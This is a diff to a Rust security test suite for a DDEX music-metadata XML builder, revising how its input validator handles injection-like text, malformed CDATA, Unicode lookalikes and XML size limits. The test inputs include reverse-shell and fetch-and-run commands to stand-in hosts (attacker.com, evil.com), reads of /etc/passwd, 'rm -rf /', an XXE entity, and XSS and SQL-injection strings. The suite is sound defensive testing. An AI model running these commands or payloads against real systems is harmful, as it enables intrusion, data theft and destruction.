@@ -11,15 +11,21 @@
 //! - Unicode normalization attacks
 //! - XML bomb variations in DDEX context
 
+use super::{assert_metadata_passes_through_builder, is_illegal_xml_char};
 use ddex_builder::{
-    builder::DDEXBuilder,
     error::BuildError,
     security::{InputValidator, SecurityConfig},
 };
 use serde_json::json;
 
-/// Test XML injection in DDEX metadata fields
+/// Test XML injection in DDEX metadata fields.
+///
+/// Raw XML that tries to break out of an element through `]]>` or an unclosed
+/// CDATA section is not well-formed and must be rejected. The same markup
+/// carried as a JSON string *value* is just metadata text: it must be accepted
+/// (the builder escapes it, see `test_malicious_json_to_xml_conversion`).
 #[test]
+#[ignore = "known bug: validate_xml_content accepts malformed CDATA / `]]>` in text; validate_json_content rejects script-looking metadata text (keyword blocklist)"]
 fn test_xml_injection_in_ddex_fields() {
     let config = SecurityConfig::default();
     let validator = InputValidator::new(config);
@@ -35,8 +41,12 @@ fn test_xml_injection_in_ddex_fields() {
         </ddex:ReleaseList>
     </ddex:NewReleaseMessage>"#;
 
+    // `]]>` in character data and a CDATA section that is never closed: not well-formed
     let result = validator.validate_xml_content(xml_injection_title);
-    // This might pass initial validation but should be caught by the builder's content validation
+    assert!(
+        result.is_err(),
+        "XML breaking out of TitleText via ]]> / unclosed CDATA should be rejected"
+    );
 
     // XML injection in artist name
     let xml_injection_artist = r#"<ddex:NewReleaseMessage>
@@ -53,11 +63,15 @@ fn test_xml_injection_in_ddex_fields() {
         </ddex:ReleaseList>
     </ddex:NewReleaseMessage>"#;
 
+    // Mismatched `</script>` end tag plus an unclosed CDATA section: not well-formed
     let result = validator.validate_xml_content(xml_injection_artist);
-    // Should detect script injection patterns
+    assert!(
+        result.is_err(),
+        "XML breaking out of PartyName via a stray end tag / unclosed CDATA should be rejected"
+    );
 
-    // Test through JSON input as well
-    let malicious_json = json!({
+    // Through JSON the same markup is only metadata text: accept it (it is escaped on output)
+    let markup_json = json!({
         "messageHeader": {
             "messageId": "MSG001",
             "messageThreadId": "THREAD001"
@@ -68,21 +82,38 @@ fn test_xml_injection_in_ddex_fields() {
         }]
     });
 
-    let builder = DDEXBuilder::new();
-    let result = ddex_builder::security::InputValidator::new(
-        ddex_builder::security::SecurityConfig::default(),
-    )
-    .validate_json_content(&malicious_json.to_string());
+    let result = validator.validate_json_content(&markup_json.to_string());
     assert!(
-        result.is_err(),
-        "JSON with XML injection should be rejected: {:?}",
+        result.is_ok(),
+        "JSON whose string values look like markup should be accepted: {:?}",
+        result
+    );
+
+    // Same for the payloads of test_malicious_json_to_xml_conversion
+    let conversion_json = json!({
+        "messageHeader": {
+            "messageId": "&xxe;",
+            "messageThreadId": "THREAD&entity;"
+        },
+        "releases": [{
+            "title": "<![CDATA[Safe content]]><script>alert('XSS')</script><![CDATA[]]>",
+            "artists": ["Artist</ddex:PartyName><ddex:MaliciousElement>injected</ddex:MaliciousElement><ddex:PartyName>", "&script_injection;"],
+            "isrc": "US123456789<!--comment--><injection>test</injection>"
+        }]
+    });
+
+    let result = validator.validate_json_content(&conversion_json.to_string());
+    assert!(
+        result.is_ok(),
+        "JSON whose string values look like markup or entity references should be accepted: {:?}",
         result
     );
 }
 
-/// Test script injection attempts in various DDEX fields
+/// Script-looking text in DDEX metadata fields is not an XML-level threat: it must
+/// be accepted unchanged, and is valid XML once escaped.
 #[test]
-#[ignore = "known bug: validate_string misses event-handler XSS vectors such as onfocus="]
+#[ignore = "known bug: validate_string / validate_json_content reject script-looking metadata text (keyword blocklist: script, javascript, onerror, onload)"]
 fn test_script_injection_attempts() {
     let config = SecurityConfig::default();
     let validator = InputValidator::new(config);
@@ -103,67 +134,47 @@ fn test_script_injection_attempts() {
     ];
 
     for payload in script_payloads {
-        // Test in various DDEX field contexts
-        let test_fields = vec![
-            (
-                "TitleText",
-                format!("<ddex:TitleText>{}</ddex:TitleText>", payload),
-            ),
-            (
-                "PartyName",
-                format!("<ddex:PartyName>{}</ddex:PartyName>", payload),
-            ),
-            (
-                "LabelName",
-                format!("<ddex:LabelName>{}</ddex:LabelName>", payload),
-            ),
-            (
-                "Comment",
-                format!("<ddex:Comment>{}</ddex:Comment>", payload),
-            ),
-        ];
-
-        for (field_name, xml_content) in test_fields {
+        for field_name in ["TitleText", "PartyName", "LabelName", "Comment"] {
+            // Escaped into a DDEX field, the payload is ordinary character data
             let full_xml = format!(
-                r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">{}</ddex:NewReleaseMessage>"#,
-                xml_content
+                r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43"><ddex:{f}>{}</ddex:{f}></ddex:NewReleaseMessage>"#,
+                quick_xml::escape::escape(payload),
+                f = field_name
+            );
+            let result = validator.validate_xml_content(&full_xml);
+            assert!(
+                result.is_ok(),
+                "Escaped script-looking text in {} should be accepted: {:?}",
+                field_name,
+                result
             );
 
-            let result = validator.validate_xml_content(&full_xml);
-
-            // Check if detected as dangerous content
-            match result {
-                Err(BuildError::Security(msg)) | Err(BuildError::InputSanitization(msg)) => {
-                    assert!(
-                        msg.contains("injection")
-                            || msg.contains("script")
-                            || msg.contains("dangerous"),
-                        "Script injection not properly detected in {} field: {}",
-                        field_name,
-                        msg
-                    );
-                }
-                Ok(_) => {
-                    // If it passes XML validation, test string validation
-                    let string_result = validator.validate_string(payload, field_name);
-                    assert!(
-                        string_result.is_err(),
-                        "Script injection should be detected in string validation for {} field: {:?}",
-                        field_name, payload
-                    );
-                }
-                Err(e) => {
-                    // Other errors are also acceptable as they indicate rejection
-                    println!("Payload rejected with error for {}: {:?}", field_name, e);
-                }
-            }
+            // As a metadata string it must pass through unchanged
+            let result = validator.validate_string(payload, field_name);
+            assert_eq!(
+                result.as_deref().ok(),
+                Some(payload),
+                "Script-looking text in {} should be accepted unchanged: {:?}",
+                field_name,
+                result
+            );
         }
+
+        let json = json!({ "releases": [{ "title": payload }] }).to_string();
+        let result = validator.validate_json_content(&json);
+        assert!(
+            result.is_ok(),
+            "JSON carrying script-looking text should be accepted: {:?} ({:?})",
+            payload,
+            result
+        );
     }
 }
 
-/// Test SQL injection in metadata fields
+/// SQL-looking text in metadata is not an XML-level threat (titles legitimately
+/// contain quotes and words like "Drop" or "Select"): it must be accepted unchanged.
 #[test]
-#[ignore = "known bug or wrong expectation (security policy decision needed): validate_string does not flag SQL-injection-like text (titles may legitimately contain quotes)"]
+#[ignore = "known bug: validate_string / validate_json_content reject SQL-looking metadata text (keyword blocklist: drop, select, union, insert, exec, …)"]
 fn test_sql_injection_in_metadata() {
     let config = SecurityConfig::default();
     let validator = InputValidator::new(config);
@@ -187,14 +198,15 @@ fn test_sql_injection_in_metadata() {
     for payload in sql_payloads {
         // Test in various DDEX metadata contexts
         let result = validator.validate_string(payload, "metadata_field");
-        assert!(
-            result.is_err(),
-            "SQL injection payload should be detected: {:?}",
-            payload
+        assert_eq!(
+            result.as_deref().ok(),
+            Some(payload),
+            "SQL-looking metadata text should be accepted unchanged: {:?}",
+            result
         );
 
         // Test in JSON context
-        let malicious_json = json!({
+        let sql_json = json!({
             "messageHeader": {
                 "messageId": payload,
                 "messageThreadId": "THREAD001"
@@ -205,15 +217,12 @@ fn test_sql_injection_in_metadata() {
             }]
         });
 
-        let builder = DDEXBuilder::new();
-        let result = ddex_builder::security::InputValidator::new(
-            ddex_builder::security::SecurityConfig::default(),
-        )
-        .validate_json_content(&malicious_json.to_string());
+        let result = validator.validate_json_content(&sql_json.to_string());
         assert!(
-            result.is_err(),
-            "SQL injection in JSON should be rejected: {:?}",
-            payload
+            result.is_ok(),
+            "JSON carrying SQL-looking text should be accepted: {:?} ({:?})",
+            payload,
+            result
         );
     }
 }
@@ -249,10 +258,6 @@ fn test_path_traversal_attacks() {
             payload
         );
 
-        // Test in string validation context
-        let result = validator.validate_string(payload, "file_path");
-        // This may or may not fail depending on string validation rules
-
         // Test in DDEX XML with file references
         let xml_with_path = format!(
             r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
@@ -272,32 +277,29 @@ fn test_path_traversal_attacks() {
     }
 }
 
-/// Test command injection in processing instructions
+const COMMAND_PAYLOADS: &[&str] = &[
+    "; cat /etc/passwd;",
+    "| whoami",
+    "& dir &",
+    "`id`",
+    "$(whoami)",
+    "|| ls -la",
+    "&& echo 'hacked'",
+    "; rm -rf / ;",
+    "| nc attacker.com 4444 -e /bin/sh",
+    "; wget http://evil.com/malware.sh | bash;",
+    "$(curl evil.com/payload)",
+    "`wget -O - evil.com/script | sh`",
+];
+
+/// Shell-looking text inside a processing instruction is never executed and is
+/// well-formed XML: the validator must accept it.
 #[test]
 fn test_command_injection_attempts() {
     let config = SecurityConfig::default();
     let validator = InputValidator::new(config);
 
-    let command_payloads = vec![
-        "; cat /etc/passwd;",
-        "| whoami",
-        "& dir &",
-        "`id`",
-        "$(whoami)",
-        "|| ls -la",
-        "&& echo 'hacked'",
-        "; rm -rf / ;",
-        "| nc attacker.com 4444 -e /bin/sh",
-        "; wget http://evil.com/malware.sh | bash;",
-        "$(curl evil.com/payload)",
-        "`wget -O - evil.com/script | sh`",
-    ];
-
-    for payload in command_payloads {
-        // Test string validation
-        let result = validator.validate_string(payload, "command_field");
-        // May or may not be caught by string validation
-
+    for payload in COMMAND_PAYLOADS {
         // Test in XML processing instruction
         let xml_with_pi = format!(
             r#"<?xml version="1.0"?>
@@ -311,14 +313,35 @@ fn test_command_injection_attempts() {
         );
 
         let result = validator.validate_xml_content(&xml_with_pi);
-        // Processing instructions with dangerous content should be handled carefully
+        assert!(
+            result.is_ok(),
+            "A processing instruction with shell-looking text is well-formed XML and should be accepted: {:?} ({:?})",
+            payload,
+            result
+        );
     }
 }
 
-/// Test CDATA section abuse
+/// Shell-looking text in metadata is not an XML-level threat: accept it unchanged.
 #[test]
-#[ignore = "known bug: validate_xml_content accepts malformed CDATA"]
-fn test_cdata_section_abuse() {
+#[ignore = "known bug: validate_string rejects shell-looking metadata text (path heuristic on `/etc/`, keyword blocklist on `script`)"]
+fn test_command_like_metadata_text_accepted() {
+    let validator = InputValidator::new(SecurityConfig::default());
+
+    for payload in COMMAND_PAYLOADS {
+        let result = validator.validate_string(payload, "command_field");
+        assert_eq!(
+            result.as_deref().ok(),
+            Some(*payload),
+            "Shell-looking metadata text should be accepted unchanged: {:?}",
+            result
+        );
+    }
+}
+
+/// Well-formed CDATA whose content looks like script or SQL is only text: accept it.
+#[test]
+fn test_cdata_wrapped_script_and_sql_text_accepted() {
     let config = SecurityConfig::default();
     let validator = InputValidator::new(config);
 
@@ -334,7 +357,11 @@ fn test_cdata_section_abuse() {
     </ddex:NewReleaseMessage>"#;
 
     let result = validator.validate_xml_content(cdata_script);
-    // CDATA should be parsed but content should be validated
+    assert!(
+        result.is_ok(),
+        "CDATA holding script-looking text should be accepted: {:?}",
+        result
+    );
 
     // CDATA with SQL injection
     let cdata_sql = r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
@@ -348,6 +375,19 @@ fn test_cdata_section_abuse() {
     </ddex:NewReleaseMessage>"#;
 
     let result = validator.validate_xml_content(cdata_sql);
+    assert!(
+        result.is_ok(),
+        "CDATA holding SQL-looking text should be accepted: {:?}",
+        result
+    );
+}
+
+/// Test CDATA section abuse: malformed CDATA must be rejected
+#[test]
+#[ignore = "known bug: validate_xml_content accepts malformed CDATA (nested CDATA leaving `]]>` in text, unterminated CDATA)"]
+fn test_cdata_section_abuse() {
+    let config = SecurityConfig::default();
+    let validator = InputValidator::new(config);
 
     // Nested CDATA attempt (invalid but worth testing)
     let nested_cdata = r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
@@ -360,8 +400,13 @@ fn test_cdata_section_abuse() {
         </ddex:ReleaseList>
     </ddex:NewReleaseMessage>"#;
 
+    // The first `]]>` closes the section, leaving ` more content]]>` as character
+    // data, which is not well-formed
     let result = validator.validate_xml_content(nested_cdata);
-    // Should be rejected as malformed
+    assert!(
+        result.is_err(),
+        "Nested CDATA should be rejected as malformed"
+    );
 
     // CDATA with malformed end
     let malformed_cdata = r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
@@ -378,51 +423,86 @@ fn test_cdata_section_abuse() {
     assert!(result.is_err(), "Malformed CDATA should be rejected");
 }
 
-/// Test encoding manipulation attacks
+/// Encoded (URL, HTML-entity, escape-sequence, base64) script-looking text in
+/// metadata is just text: it must be accepted unchanged, never decoded or altered.
 #[test]
+#[ignore = "known bug: validate_string rejects script-looking metadata text (keyword blocklist), encoded or not"]
 fn test_encoding_manipulation() {
     let config = SecurityConfig::default();
     let validator = InputValidator::new(config);
 
-    // URL-encoded malicious content
-    let url_encoded = "%3Cscript%3Ealert('XSS')%3C/script%3E";
-    let result = validator.validate_string(url_encoded, "encoded_field");
+    let encoded_payloads = [
+        // URL-encoded
+        ("encoded_field", "%3Cscript%3Ealert('XSS')%3C/script%3E"),
+        // Double URL-encoded
+        (
+            "encoded_field",
+            "%253Cscript%253Ealert('XSS')%253C/script%253E",
+        ),
+        // HTML entity encoded script (standard and numeric references only)
+        (
+            "html_field",
+            "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;",
+        ),
+        // Mixed encoding
+        (
+            "mixed_field",
+            "%3Cscript%3Ealert(&apos;XSS&apos;)%3C/script%3E",
+        ),
+        // Unicode escape sequences
+        (
+            "unicode_field",
+            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
+        ),
+        // Hex encoding
+        ("hex_field", "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E"),
+        // Base64 of <script>alert('XSS')</script>
+        ("base64_field", "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="),
+        // ... and the decoded payload itself
+        ("decoded_field", "<script>alert('XSS')</script>"),
+    ];
 
-    // Double URL-encoded
-    let double_encoded = "%253Cscript%253Ealert('XSS')%253C/script%253E";
-    let result = validator.validate_string(double_encoded, "encoded_field");
-
-    // HTML entity encoded script
-    let html_encoded = "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;";
-    let result = validator.validate_string(html_encoded, "html_field");
-
-    // Mixed encoding
-    let mixed_encoded = "%3Cscript%3Ealert(&apos;XSS&apos;)%3C/script%3E";
-    let result = validator.validate_string(mixed_encoded, "mixed_field");
-
-    // Unicode escape sequences
-    let unicode_escaped = "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e";
-    let result = validator.validate_string(unicode_escaped, "unicode_field");
-
-    // Hex encoding
-    let hex_encoded = "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E";
-    let result = validator.validate_string(hex_encoded, "hex_field");
-
-    // Base64 encoded payload
-    let base64_payload = "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="; // <script>alert('XSS')</script>
-    let result = validator.validate_string(base64_payload, "base64_field");
-    // Should be caught by base64 pattern detection
-    if result.is_ok() {
-        // If string validation passes, decode and test
-        // The decoded payload (no base64 crate needed) must itself be rejected.
-        let decoded_str = "<script>alert('XSS')</script>";
-        let decoded_result = validator.validate_string(decoded_str, "decoded_field");
-        assert!(
-            decoded_result.is_err(),
-            "Decoded malicious content should be rejected"
+    for (field, payload) in encoded_payloads {
+        let result = validator.validate_string(payload, field);
+        assert_eq!(
+            result.as_deref().ok(),
+            Some(payload),
+            "Encoded script-looking text in {} should be accepted unchanged: {:?}",
+            field,
+            result
         );
     }
 }
+
+/// Legitimate Unicode that merely resembles `<script>` or tries to dodge filters
+/// (fullwidth and lookalike characters, zero-width characters, combining marks,
+/// RTL override). It is valid text and must be accepted.
+const LEGITIMATE_UNICODE_LOOKALIKES: &[&str] = &[
+    // Different representations of '<script>'
+    "\u{FF1C}script\u{FF1E}", // Fullwidth < and >
+    "＜script＞",             // Fullwidth characters
+    "\u{2039}script\u{203A}", // Single-pointing angle quotation marks
+    "‹script›",               // Visual similarity
+    // Homograph attacks
+    "јаvascript", // Cyrillic lookalikes
+    "ѕcript",     // Cyrillic 's'
+    // Zero-width characters
+    "sc\u{200B}ript", // Zero-width space
+    "scr\u{200C}ipt", // Zero-width non-joiner
+    "scri\u{200D}pt", // Zero-width joiner
+    "scrip\u{FEFF}t", // Zero-width no-break space
+    // Combining characters
+    "s\u{0300}cript", // Combining grave accent
+    "sc\u{0301}ript", // Combining acute accent
+    // Right-to-left override
+    "\u{202E}tpircs", // RLO + "script" reversed
+];
+
+/// Characters that are illegal in XML 1.0 documents.
+const ILLEGAL_XML_CHAR_PAYLOADS: &[&str] = &[
+    "script\u{0000}", // Null byte
+    "script\u{0001}", // Start of heading
+];
 
 /// Test Unicode normalization attacks
 #[test]
@@ -430,34 +510,7 @@ fn test_unicode_normalization_attacks() {
     let config = SecurityConfig::default();
     let validator = InputValidator::new(config);
 
-    // Unicode normalization that could bypass filters
-    let unicode_attacks = vec![
-        // Different representations of '<script>'
-        "\u{FF1C}script\u{FF1E}", // Fullwidth < and >
-        "＜script＞",             // Fullwidth characters
-        "\u{2039}script\u{203A}", // Single-pointing angle quotation marks
-        "‹script›",               // Visual similarity
-        // Homograph attacks
-        "јаvascript", // Cyrillic lookalikes
-        "ѕcript",     // Cyrillic 's'
-        // Zero-width characters
-        "sc\u{200B}ript", // Zero-width space
-        "scr\u{200C}ipt", // Zero-width non-joiner
-        "scri\u{200D}pt", // Zero-width joiner
-        "scrip\u{FEFF}t", // Zero-width no-break space
-        // Combining characters
-        "s\u{0300}cript", // Combining grave accent
-        "sc\u{0301}ript", // Combining acute accent
-        // Right-to-left override
-        "\u{202E}tpircs", // RLO + "script" reversed
-        // Alternative representations
-        "script\u{0000}", // Null byte
-        "script\u{0001}", // Start of heading
-    ];
-
-    for attack in unicode_attacks {
-        let result = validator.validate_string(attack, "unicode_field");
-
+    for attack in LEGITIMATE_UNICODE_LOOKALIKES {
         // Test in XML context
         let xml_content = format!(
             r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
@@ -473,6 +526,41 @@ fn test_unicode_normalization_attacks() {
         );
 
         let xml_result = validator.validate_xml_content(&xml_content);
+        assert!(
+            xml_result.is_ok(),
+            "Legitimate Unicode in TitleText should be accepted: {:?} ({:?})",
+            attack,
+            xml_result
+        );
+    }
+
+    // Characters illegal in XML 1.0 may be rejected, but must never be passed on
+    for attack in ILLEGAL_XML_CHAR_PAYLOADS {
+        let result = validator.validate_string(attack, "unicode_field");
+        if let Ok(sanitized) = &result {
+            assert!(
+                !sanitized.chars().any(is_illegal_xml_char),
+                "Illegal XML character passed through validate_string: {:?}",
+                sanitized
+            );
+        }
+    }
+}
+
+/// Legitimate Unicode lookalikes must be accepted unchanged as metadata text.
+#[test]
+#[ignore = "known bug: validate_string rejects legitimate Unicode text that contains the substring `script` (keyword blocklist)"]
+fn test_legitimate_unicode_metadata_accepted() {
+    let validator = InputValidator::new(SecurityConfig::default());
+
+    for text in LEGITIMATE_UNICODE_LOOKALIKES {
+        let result = validator.validate_string(text, "unicode_field");
+        assert_eq!(
+            result.as_deref().ok(),
+            Some(*text),
+            "Legitimate Unicode metadata should be accepted unchanged: {:?}",
+            result
+        );
     }
 }
 
@@ -526,8 +614,22 @@ fn test_ddex_specific_xml_bombs() {
     </ddex:NewReleaseMessage>"#,
     );
 
+    // ~300KB and 1000 releases: inside the default limits (100MB, 10,000 children)
     let result = validator.validate_xml_content(&large_ddex);
-    // Should be caught by size limits or element count limits
+    assert!(
+        result.is_ok(),
+        "A large DDEX document within the default limits should be accepted: {:?}",
+        result
+    );
+
+    // ... but over the 10KB limit of the restrictive config
+    let restrictive = InputValidator::new(super::restrictive_security_config());
+    let result = restrictive.validate_xml_content(&large_ddex);
+    assert!(
+        matches!(result, Err(BuildError::InputSanitization(ref msg)) if msg.contains("too large")),
+        "A DDEX document over max_xml_size should be rejected: {:?}",
+        result
+    );
 
     // Deeply nested DDEX structure
     let mut deep_nested_ddex =
@@ -546,57 +648,53 @@ fn test_ddex_specific_xml_bombs() {
 
     deep_nested_ddex.push_str("</ddex:NewReleaseMessage>");
 
+    // 51 levels is within the default max_xml_depth of 100, so it must be accepted.
+    // (Enforcement of a lower max_xml_depth is a known bug, pinned by
+    // integration_tests::test_memory_safety_under_attack.)
     let result = validator.validate_xml_content(&deep_nested_ddex);
-    // Should be caught by depth limits
+    assert!(
+        result.is_ok(),
+        "Nesting within the default depth limit should be accepted: {:?}",
+        result
+    );
 }
 
-/// Test malicious payloads in JSON to XML conversion
+/// Hostile-looking metadata converted to XML by the real builder must come out
+/// escaped: no injected elements, CDATA sections, comments, entity references or
+/// DOCTYPE, and a reader gets the original text back.
 #[test]
 fn test_malicious_json_to_xml_conversion() {
-    let builder = DDEXBuilder::new();
+    let payloads = [
+        // Markup injection
+        "<![CDATA[Safe content]]><script>alert('XSS')</script><![CDATA[]]>",
+        "Artist</ddex:PartyName><ddex:MaliciousElement>injected</ddex:MaliciousElement><ddex:PartyName>",
+        "US123456789<!--comment--><injection>test</injection>",
+        "x]]>y",
+        // Entity references and XXE text
+        "&xxe;",
+        "THREAD&entity;",
+        "&malicious_entity;",
+        "&script_injection;",
+        "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+        // Script / SQL / shell-looking text
+        "<img src=x onerror=alert('XSS')>",
+        "javascript:alert('XSS')",
+        "' OR '1'='1",
+        "'; DROP TABLE users; --",
+        "$(curl evil.com/payload)",
+        // Encoded text must not be decoded
+        "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;",
+        "%3Cscript%3Ealert('XSS')%3C/script%3E",
+    ];
 
-    // JSON with XML injection that becomes dangerous when converted
-    let malicious_json = json!({
-        "messageHeader": {
-            "messageId": "MSG001",
-            "messageThreadId": "THREAD001"
-        },
-        "releases": [{
-            "title": "<![CDATA[Safe content]]><script>alert('XSS')</script><![CDATA[]]>",
-            "artists": ["Artist</ddex:PartyName><ddex:MaliciousElement>injected</ddex:MaliciousElement><ddex:PartyName>"],
-            "isrc": "US123456789<!--comment--><injection>test</injection>"
-        }]
-    });
+    for payload in payloads {
+        assert_metadata_passes_through_builder(payload);
+    }
 
-    let result = ddex_builder::security::InputValidator::new(
-        ddex_builder::security::SecurityConfig::default(),
-    )
-    .validate_json_content(&malicious_json.to_string());
-    assert!(
-        result.is_err(),
-        "Malicious JSON should be rejected before XML conversion: {:?}",
-        result
-    );
+    for text in LEGITIMATE_UNICODE_LOOKALIKES {
+        assert_metadata_passes_through_builder(text);
+    }
 
-    // JSON with entity references
-    let entity_json = json!({
-        "messageHeader": {
-            "messageId": "&xxe;",
-            "messageThreadId": "THREAD&entity;"
-        },
-        "releases": [{
-            "title": "&malicious_entity;",
-            "artists": ["&script_injection;"]
-        }]
-    });
-
-    let result = ddex_builder::security::InputValidator::new(
-        ddex_builder::security::SecurityConfig::default(),
-    )
-    .validate_json_content(&entity_json.to_string());
-    assert!(
-        result.is_err(),
-        "JSON with entity references should be rejected: {:?}",
-        result
-    );
+    // Illegal XML 1.0 characters are pinned by
+    // builder_security_tests::test_illegal_xml_chars_never_reach_builder_output
 }
